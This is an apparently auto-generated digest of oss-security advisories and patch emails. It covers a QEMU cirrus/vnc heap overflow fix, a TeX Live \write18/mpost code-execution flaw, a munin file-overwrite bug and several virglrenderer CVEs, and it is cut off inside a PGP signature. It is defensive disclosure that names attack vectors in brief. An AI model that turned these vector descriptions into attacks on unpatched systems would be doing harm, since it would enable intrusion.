-            } else if (!x) {
-                s = (VNC_DIRTY_PIXELS_PER_BIT -
-                    (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-                s = MIN(s, w_lim);
-            } else {
-                s = VNC_DIRTY_PIXELS_PER_BIT;
-            }
-            cmp_bytes = s * VNC_SERVER_FB_BYTES;
-            if (memcmp(src_row, dst_row, cmp_bytes) == 0)
-                continue;
-            memmove(dst_row, src_row, cmp_bytes);
-            QTAILQ_FOREACH(vs, &vd->clients, next) {
-                if (!vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-                    set_bit(((x + dst_x) / VNC_DIRTY_PIXELS_PER_BIT),
-                            vs->dirty[y]);
-                }
-            }
-        }
-        src_row += pitch - w * VNC_SERVER_FB_BYTES;
-        dst_row += pitch - w * VNC_SERVER_FB_BYTES;
-        y += inc;
-    }
-
-    QTAILQ_FOREACH(vs, &vd->clients, next) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vnc_copy(vs, src_x, src_y, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 static void vnc_mouse_set(DisplayChangeListener *dcl,
                           int x, int y, int visible)
 {
@@ -3131,7 +3041,6 @@ static void vnc_listen_websocket_read(void *opaque)
 static const DisplayChangeListenerOps dcl_ops = {
     .dpy_name             = "vnc",
     .dpy_refresh          = vnc_refresh,
-    .dpy_gfx_copy         = vnc_dpy_copy,
     .dpy_gfx_update       = vnc_dpy_update,
     .dpy_gfx_switch       = vnc_dpy_switch,
     .dpy_gfx_check_format = qemu_pixman_check_format,
-- 
2.1.4


```

</details>
<details><summary>Additional Parts</summary>

```
From 7563ddb0bd67e7e54568e017cb7d4f7f556587fc Mon Sep 17 00:00:00 2001
From: Gerd Hoffmann <kraxel@redhat.com>
Date: Tue, 14 Feb 2017 19:09:59 +0100
Subject: [PATCH] cirrus/vnc: zap bitblit support from console code.

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c | 12 ++-----
 include/ui/console.h    |  7 ----
 ui/console.c            | 28 ---------------
 ui/vnc.c                | 96 -------------------------------------------------
 4 files changed, 3 insertions(+), 140 deletions(-)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index 9a4e90a..2966125 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -760,11 +760,6 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
         }
     }
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-        graphic_hw_update(s->vga.con);
-
     (*s->cirrus_rop) (s, s->vga.vram_ptr +
 		      (s->cirrus_blt_dstaddr & s->cirrus_addr_mask),
 		      s->vga.vram_ptr +
@@ -773,10 +768,9 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify) {
-        qemu_console_copy(s->vga.con,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+        dpy_gfx_update(s->vga.con, dx, dy,
+                       s->cirrus_blt_width / depth,
+                       s->cirrus_blt_height);
     }
 
     /* we don't have to notify the display that this portion has
diff --git a/include/ui/console.h b/include/ui/console.h
index 2703a3a..67927ed 100644
--- a/include/ui/console.h
+++ b/include/ui/console.h
@@ -189,9 +189,6 @@ typedef struct DisplayChangeListenerOps {
                            int x, int y, int w, int h);
     void (*dpy_gfx_switch)(DisplayChangeListener *dcl,
                            struct DisplaySurface *new_surface);
-    void (*dpy_gfx_copy)(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h);
     bool (*dpy_gfx_check_format)(DisplayChangeListener *dcl,
                                  pixman_format_code_t format);
 
@@ -273,8 +270,6 @@ int dpy_set_ui_info(QemuConsole *con, QemuUIInfo *info);
 void dpy_gfx_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_gfx_replace_surface(QemuConsole *con,
                              DisplaySurface *surface);
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h);
 void dpy_text_cursor(QemuConsole *con, int x, int y);
 void dpy_text_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_text_resize(QemuConsole *con, int w, int h);
@@ -398,8 +393,6 @@ void text_consoles_set_display(DisplayState *ds);
 void console_select(unsigned int index);
 void console_color_init(DisplayState *ds);
 void qemu_console_resize(QemuConsole *con, int width, int height);
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h);
 DisplaySurface *qemu_console_surface(QemuConsole *con);
 
 /* console-gl.c */
diff --git a/ui/console.c b/ui/console.c
index c24bfe4..ece0c04 100644
--- a/ui/console.c
+++ b/ui/console.c
@@ -1558,27 +1558,6 @@ static void dpy_refresh(DisplayState *s)
     }
 }
 
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h)
-{
-    DisplayState *s = con->ds;
-    DisplayChangeListener *dcl;
-
-    if (!qemu_console_is_visible(con)) {
-        return;
-    }
-    QLIST_FOREACH(dcl, &s->listeners, next) {
-        if (con != (dcl->con ? dcl->con : active_console)) {
-            continue;
-        }
-        if (dcl->ops->dpy_gfx_copy) {
-            dcl->ops->dpy_gfx_copy(dcl, src_x, src_y, dst_x, dst_y, w, h);
-        } else { /* TODO */
-            dcl->ops->dpy_gfx_update(dcl, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 void dpy_text_cursor(QemuConsole *con, int x, int y)
 {
     DisplayState *s = con->ds;
@@ -2104,13 +2083,6 @@ void qemu_console_resize(QemuConsole *s, int width, int height)
     dpy_gfx_replace_surface(s, surface);
 }
 
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h)
-{
-    assert(con->console_type == GRAPHIC_CONSOLE);
-    dpy_gfx_copy(con, src_x, src_y, dst_x, dst_y, w, h);
-}
-
 DisplaySurface *qemu_console_surface(QemuConsole *console)
 {
     return console->surface;
diff --git a/ui/vnc.c b/ui/vnc.c
index d1087c9..b45bb2c 100644
--- a/ui/vnc.c
+++ b/ui/vnc.c
@@ -872,101 +872,6 @@ int vnc_send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
     return n;
 }
 
-static void vnc_copy(VncState *vs, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    /* send bitblit op to the vnc client */
-    vnc_lock_output(vs);
-    vnc_write_u8(vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);
-    vnc_write_u8(vs, 0);
-    vnc_write_u16(vs, 1); /* number of rects */
-    vnc_framebuffer_update(vs, dst_x, dst_y, w, h, VNC_ENCODING_COPYRECT);
-    vnc_write_u16(vs, src_x);
-    vnc_write_u16(vs, src_y);
-    vnc_unlock_output(vs);
-    vnc_flush(vs);
-}
-
-static void vnc_dpy_copy(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h)
-{
-    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);
-    VncState *vs, *vn;
-    uint8_t *src_row;
-    uint8_t *dst_row;
-    int i, x, y, pitch, inc, w_lim, s;
-    int cmp_bytes;
-
-    if (!vd->server) {
-        /* no client connected */
-        return;
-    }
-
-    vnc_refresh_server_surface(vd);
-    QTAILQ_FOREACH_SAFE(vs, &vd->clients, next, vn) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vs->force_update = 1;
-            vnc_update_client(vs, 1, true);
-            /* vs might be free()ed here */
-        }
-    }
-
-    /* do bitblit op on the local surface too */
-    pitch = vnc_server_fb_stride(vd);
-    src_row = vnc_server_fb_ptr(vd, src_x, src_y);
-    dst_row = vnc_server_fb_ptr(vd, dst_x, dst_y);
-    y = dst_y;
-    inc = 1;
-    if (dst_y > src_y) {
-        /* copy backwards */
-        src_row += pitch * (h-1);
-        dst_row += pitch * (h-1);
-        pitch = -pitch;
-        y = dst_y + h - 1;
-        inc = -1;
-    }
-    w_lim = w - (VNC_DIRTY_PIXELS_PER_BIT - (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-    if (w_lim < 0) {
-        w_lim = w;
-    } else {
-        w_lim = w - (w_lim % VNC_DIRTY_PIXELS_PER_BIT);
-    }
-    for (i = 0; i < h; i++) {
-        for (x = 0; x <= w_lim;
-                x += s, src_row += cmp_bytes, dst_row += cmp_bytes) {
-            if (x == w_lim) {
-                if ((s = w - w_lim) == 0)
-                    break;
-            } else if (!x) {
-                s = (VNC_DIRTY_PIXELS_PER_BIT -
-                    (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-                s = MIN(s, w_lim);
-            } else {
-                s = VNC_DIRTY_PIXELS_PER_BIT;
-            }
-            cmp_bytes = s * VNC_SERVER_FB_BYTES;
-            if (memcmp(src_row, dst_row, cmp_bytes) == 0)
-                continue;
-            memmove(dst_row, src_row, cmp_bytes);
-            QTAILQ_FOREACH(vs, &vd->clients, next) {
-                if (!vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-                    set_bit(((x + dst_x) / VNC_DIRTY_PIXELS_PER_BIT),
-                            vs->dirty[y]);
-                }
-            }
-        }
-        src_row += pitch - w * VNC_SERVER_FB_BYTES;
-        dst_row += pitch - w * VNC_SERVER_FB_BYTES;
-        y += inc;
-    }
-
-    QTAILQ_FOREACH(vs, &vd->clients, next) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vnc_copy(vs, src_x, src_y, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 static void vnc_mouse_set(DisplayChangeListener *dcl,
                           int x, int y, int visible)
 {
@@ -3119,7 +3024,6 @@ static gboolean vnc_listen_io(QIOChannel *ioc,
 static const DisplayChangeListenerOps dcl_ops = {
     .dpy_name             = "vnc",
     .dpy_refresh          = vnc_refresh,
-    .dpy_gfx_copy         = vnc_dpy_copy,
     .dpy_gfx_update       = vnc_dpy_update,
     .dpy_gfx_switch       = vnc_dpy_switch,
     .dpy_gfx_check_format = qemu_pixman_check_format,
-- 
2.1.4


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] CVE-2016-9603 Qemu: cirrus: heap buffer overflow via vnc connection</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489492879.19276_1.Morbo,U=9163:2,T -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1703141704180.24688@wniryva`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
   Hello,

Quick Emulator(Qemu) built with the Cirrus CLGD 54xx VGA Emulator and the VNC 
display driver support is vulnerable to a heap buffer overflow issue. It could 
occur when Vnc client attempts to update its display after a vga operation is 
performed by a guest.

A privileged user/process inside guest could use this flaw to crash the Qemu 
process resulting in DoS OR potentially leverage it to execute arbitrary code 
on the host with privileges of the Qemu process.

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1430056

* 'CVE-2016-9603' has been assigned to this issue by Red Hat Inc.
* Attached herein is a proposed upstream patch to fix this issue.

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>
<details><summary>Additional Parts</summary>

```
From af759489ee2bcd87f7c3231edd311f11f1c055fe Mon Sep 17 00:00:00 2001
From: Gerd Hoffmann <kraxel@redhat.com>
Date: Tue, 14 Feb 2017 19:09:59 +0100
Subject: [PATCH] cirrus/vnc: zap bitblit support from console code.

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c |  12 ++----
 include/ui/console.h    |   7 ----
 ui/console.c            |  28 --------------
 ui/vnc.c                | 100 ------------------------------------------------
 4 files changed, 3 insertions(+), 144 deletions(-)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index 8e111c2..38efc9b 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -796,21 +796,15 @@ static int cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
         }
     }
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-        graphic_hw_update(s->vga.con);
-
     (*s->cirrus_rop) (s, s->vga.vram_ptr + s->cirrus_blt_dstaddr,
                       s->vga.vram_ptr + s->cirrus_blt_srcaddr,
 		      s->cirrus_blt_dstpitch, s->cirrus_blt_srcpitch,
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify) {
-        qemu_console_copy(s->vga.con,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+        dpy_gfx_update(s->vga.con, dx, dy,
+                       s->cirrus_blt_width / depth,
+                       s->cirrus_blt_height);
     }
 
     /* we don't have to notify the display that this portion has
diff --git a/include/ui/console.h b/include/ui/console.h
index af6350e..3c741f7 100644
--- a/include/ui/console.h
+++ b/include/ui/console.h
@@ -189,9 +189,6 @@ typedef struct DisplayChangeListenerOps {
                            int x, int y, int w, int h);
     void (*dpy_gfx_switch)(DisplayChangeListener *dcl,
                            struct DisplaySurface *new_surface);
-    void (*dpy_gfx_copy)(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h);
     bool (*dpy_gfx_check_format)(DisplayChangeListener *dcl,
                                  pixman_format_code_t format);
 
@@ -273,8 +270,6 @@ int dpy_set_ui_info(QemuConsole *con, QemuUIInfo *info);
 void dpy_gfx_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_gfx_replace_surface(QemuConsole *con,
                              DisplaySurface *surface);
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h);
 void dpy_text_cursor(QemuConsole *con, int x, int y);
 void dpy_text_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_text_resize(QemuConsole *con, int w, int h);
@@ -406,8 +401,6 @@ void qemu_console_set_window_id(QemuConsole *con, int window_id);
 
 void console_select(unsigned int index);
 void qemu_console_resize(QemuConsole *con, int width, int height);
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h);
 DisplaySurface *qemu_console_surface(QemuConsole *con);
 
 /* console-gl.c */
diff --git a/ui/console.c b/ui/console.c
index 49d0740..c9589b4 100644
--- a/ui/console.c
+++ b/ui/console.c
@@ -1586,27 +1586,6 @@ static void dpy_refresh(DisplayState *s)
     }
 }
 
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h)
-{
-    DisplayState *s = con->ds;
-    DisplayChangeListener *dcl;
-
-    if (!qemu_console_is_visible(con)) {
-        return;
-    }
-    QLIST_FOREACH(dcl, &s->listeners, next) {
-        if (con != (dcl->con ? dcl->con : active_console)) {
-            continue;
-        }
-        if (dcl->ops->dpy_gfx_copy) {
-            dcl->ops->dpy_gfx_copy(dcl, src_x, src_y, dst_x, dst_y, w, h);
-        } else { /* TODO */
-            dcl->ops->dpy_gfx_update(dcl, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 void dpy_text_cursor(QemuConsole *con, int x, int y)
 {
     DisplayState *s = con->ds;
@@ -2124,13 +2103,6 @@ void qemu_console_resize(QemuConsole *s, int width, int height)
     dpy_gfx_replace_surface(s, surface);
 }
 
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h)
-{
-    assert(con->console_type == GRAPHIC_CONSOLE);
-    dpy_gfx_copy(con, src_x, src_y, dst_x, dst_y, w, h);
-}
-
 DisplaySurface *qemu_console_surface(QemuConsole *console)
 {
     return console->surface;
diff --git a/ui/vnc.c b/ui/vnc.c
index 62e85ed..d394e1b 100644
--- a/ui/vnc.c
+++ b/ui/vnc.c
@@ -894,105 +894,6 @@ int vnc_send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
     return n;
 }
 
-static void vnc_copy(VncState *vs, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    /* send bitblit op to the vnc client */
-    vnc_lock_output(vs);
-    vnc_write_u8(vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);
-    vnc_write_u8(vs, 0);
-    vnc_write_u16(vs, 1); /* number of rects */
-    vnc_framebuffer_update(vs, dst_x, dst_y, w, h, VNC_ENCODING_COPYRECT);
-    vnc_write_u16(vs, src_x);
-    vnc_write_u16(vs, src_y);
-    vnc_unlock_output(vs);
-    vnc_flush(vs);
-}
-
-static void vnc_dpy_copy(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h)
-{
-    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);
-    VncState *vs, *vn;
-    uint8_t *src_row;
-    uint8_t *dst_row;
-    int i, x, y, pitch, inc, w_lim, s;
-    int cmp_bytes;
-
-    if (!vd->server) {
-        /* no client connected */
-        return;
-    }
-
-    vnc_refresh_server_surface(vd);
-    QTAILQ_FOREACH_SAFE(vs, &vd->clients, next, vn) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vs->force_update = 1;
-            vnc_update_client(vs, 1, true);
-            /* vs might be free()ed here */
-        }
-    }
-
-    if (!vd->server) {
-        /* no client connected */
-        return;
-    }
-    /* do bitblit op on the local surface too */
-    pitch = vnc_server_fb_stride(vd);
-    src_row = vnc_server_fb_ptr(vd, src_x, src_y);
-    dst_row = vnc_server_fb_ptr(vd, dst_x, dst_y);
-    y = dst_y;
-    inc = 1;
-    if (dst_y > src_y) {
-        /* copy backwards */
-        src_row += pitch * (h-1);
-        dst_row += pitch * (h-1);
-        pitch = -pitch;
-        y = dst_y + h - 1;
-        inc = -1;
-    }
-    w_lim = w - (VNC_DIRTY_PIXELS_PER_BIT - (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-    if (w_lim < 0) {
-        w_lim = w;
-    } else {
-        w_lim = w - (w_lim % VNC_DIRTY_PIXELS_PER_BIT);
-    }
-    for (i = 0; i < h; i++) {
-        for (x = 0; x <= w_lim;
-                x += s, src_row += cmp_bytes, dst_row += cmp_bytes) {
-            if (x == w_lim) {
-                if ((s = w - w_lim) == 0)
-                    break;
-            } else if (!x) {
-                s = (VNC_DIRTY_PIXELS_PER_BIT -
-                    (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-                s = MIN(s, w_lim);
-            } else {
-                s = VNC_DIRTY_PIXELS_PER_BIT;
-            }
-            cmp_bytes = s * VNC_SERVER_FB_BYTES;
-            if (memcmp(src_row, dst_row, cmp_bytes) == 0)
-                continue;
-            memmove(dst_row, src_row, cmp_bytes);
-            QTAILQ_FOREACH(vs, &vd->clients, next) {
-                if (!vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-                    set_bit(((x + dst_x) / VNC_DIRTY_PIXELS_PER_BIT),
-                            vs->dirty[y]);
-                }
-            }
-        }
-        src_row += pitch - w * VNC_SERVER_FB_BYTES;
-        dst_row += pitch - w * VNC_SERVER_FB_BYTES;
-        y += inc;
-    }
-
-    QTAILQ_FOREACH(vs, &vd->clients, next) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vnc_copy(vs, src_x, src_y, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 static void vnc_mouse_set(DisplayChangeListener *dcl,
                           int x, int y, int visible)
 {
@@ -3120,7 +3021,6 @@ static gboolean vnc_listen_io(QIOChannel *ioc,
 static const DisplayChangeListenerOps dcl_ops = {
     .dpy_name             = "vnc",
     .dpy_refresh          = vnc_refresh,
-    .dpy_gfx_copy         = vnc_dpy_copy,
     .dpy_gfx_update       = vnc_dpy_update,
     .dpy_gfx_switch       = vnc_dpy_switch,
     .dpy_gfx_check_format = qemu_pixman_check_format,
-- 
1.8.3.1


```

</details>

---

</details>

## texlive
<details>
<summary><strong>[oss-security] TeX Live: CVE-2016-10243: whitelists a insecure binary/utility to be run as external program</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488717878.2210_74.Morbo,U=39140:2, -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170305105226.smsiuiqnhkrjnh6j@eldamar.local`

```
Hi

Via http://cveform.mitre.org/ CVE-2016-10243 was assigned for the
following issue in the TeX Live system:

> The TeX system allows for calling external programs from within the
> TeX source code (called \write18). This has been restricted to a
> small set of programs since a long time ago.
>
> Unfortunately it turned out that one program in the list, mpost
> (also shipped with TeX Live), allows in turn to specify other
> programs to be run, which allows arbitrary code execution when
> compiling a TeX document.

Upstream commit addressing the issue:

https://www.tug.org/svn/texlive?view=revision&revision=42605

Report on the issue:

https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/

Regards,
Salvatore

```

</details>

## munin
<details>
<summary><strong>[oss-security] munin: CVE-2017-6188: Local file write vulnerability</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487817414.10507_132.NdNdNx,U=37389:2, -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170222190849.qdh65xvhpsu5pao7@eldamar.local`

```
Munin, at least up to 2.0.30 is prone to a local file write
vulnerability, when CGI graphs are enabled. Setting mutliple
'upper_limit' GET parameters allow overwriting any file (accessible by
the user running the cgi-process).

Upstream bug: https://github.com/munin-monitoring/munin/issues/721

MITRE has assigned CVE-2017-6188 for this issue.

Regards,
Salvatore

```

</details>

## virglrenderer
<details>
<summary><strong>[oss-security] CVE-2017-6386 Virglrenderer: memory leakage while in vrend_create_vertex_elements_state</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379271.2379_86.Morbo,U=38112:2, -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1703011206260.1553@wniryva`

```
   Hello,

Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support 
for the virtio GPU, is vulnerable to memory leakage issue. It could occur when 
a guest tries to create vertex elements via 'VIRGL_OBJECT_VERTEX_ELEMENTS' 
command.

A guest user/process could use this flaw to leak host memory resulting in DoS.

Upstream patch:
---------------
   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=737c3350850ca4dbc5633b3bdb4118176ce59920

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1427472

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-6386' assigned via -> http://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>
<details>
<summary><strong>[oss-security] CVE-2017-6355 Virglrenderer: integer overflow while creating shader object</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488282779.6135_59.NdNdNx,U=7915:2,T -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1702272324550.10165@wniryva`

```
   Hello,

Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support 
for the virtio GPU, is vulnerable to an integer overflow issue. It could occur 
when creating a shader object in vrend_create_shader().

A guest user/process could use this flaw to crash the Qemu process resulting 
DoS.

Upstream patch:
---------------
   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=93761787b29f37fa627dea9082cdfc1a1ec608d6

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-6355' assigned via -> http://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>
<details>
<summary><strong>[oss-security] CVE-2017-6317 Virglrenderer: memory leakage issue in add_shader_program</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144004.28364_16.NdNdNx,U=7764:2,T -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1702250026160.1436@wniryva`

```
   Hello,

Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support 
for the virtio GPU, is vulnerable to a memory leakage issue. It could occur 
in case of an error in add_shader_program().

A guest user/process could use this flaw to leak host memory resulting in DoS.

Upstream patch:
---------------
   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=a2f12a1b0f95b13b6f8dc3d05d7b74b4386394e4

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1426756

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-6317' assigned via -> http://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>
<details>
<summary><strong>[oss-security] CVE-2017-5956 virglrenderer: Virglrenderer: OOB access while in vrend_draw_vbo</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1486985857.18212_24.NdNdNx,U=35120:2,S -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1702131021590.18948@wniryva`

```
   Hello,

Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support 
for the virtio GPU, is vulnerable to an OOB array access issue. It could occur 
when in vrend_draw_vbo.

A guest user/process could use this flaw to crash the Qemu process instance 
resulting DoS.

Upstream patch:
---------------
   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=a5ac49940c40ae415eac0cf912eac7070b4ba95d

Reference:
----------
   -> https://bugzilla.redhat.com/show_bug.cgi?id=1421073

This issue was reported by Li Qiang of 360.cn Inc.

'CVE-2017-5956' assigned via -> https://cveform.mitre.org/

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144004.28364_7.NdNdNx,U=7755:2,ST -->

##### Matthias Gerstner <mgerstner@suse.de>, `20170224100342.GA3592@f195.suse.de`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
> Upstream patch:
> ---------------
>   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=a5ac49940c40ae415eac0cf912eac7070b4ba95d

Please note that the fix for this issue opens a memory leak, because it
forgets to free the 've' structure from this line:

  ve = calloc(num_elements, sizeof(struct pipe_vertex_element));

A possible follow-up patch is attached.

I've already informed the reporter of this issue but there seems to be
no upstream fix yet.

Regards

Matthias

-- 
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security

SUSE Linux GmbH 
GF: Felix Imendörffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBAgAGBQJYsAT+AAoJEBTEBclxkjVTe9AP/0xe1EuHJdifdk5cQUliPY06
ic9ZQB7P/h8SdCBGmWagOGAldqh+zyAiC3nqJvebIArPARf4i1ayoAPO0xha50bP
YZ5vtQzTvpQ9a3Sle/GoOMtprXGC/0nJvsFT0aaVPxTobU6ffpcC7u/OqW4ngnnO
OvWjK8E6fbelpV+G+/ezCD0xhfHD0Pt4FaGeDycm8F7Xm/01gBJqByZ+4P47W0HA
ZVrmczsmzkt15re8eV9ZLhtfCZ9jcNp1T5qYsgxIM+2QTmDg2ypV13TgWPFZMn5c
nxksfq7tIcbXhgN+N5InXeZdxHQtazM9BkQUIDTJmf4saQ8UAunKZ5skiPXKlP0k
KajL/38WgldHzvnS/5OVlZ4OtM9GGokPgxSFpvlGeyAAosGzoyLmsBVBwWPTTTPO
J5slnAzBZB4j1vpiYekCuQAAJFHjpVarcQG9nJ2Q0temsoJcVvfXj2VZPU8YVcYa
oiyh6Mrxtny4gcP8H6Pu1RodgoqMDVb/2xMli9kl9sURWFNAsVBZpkqDNCRgvA1X
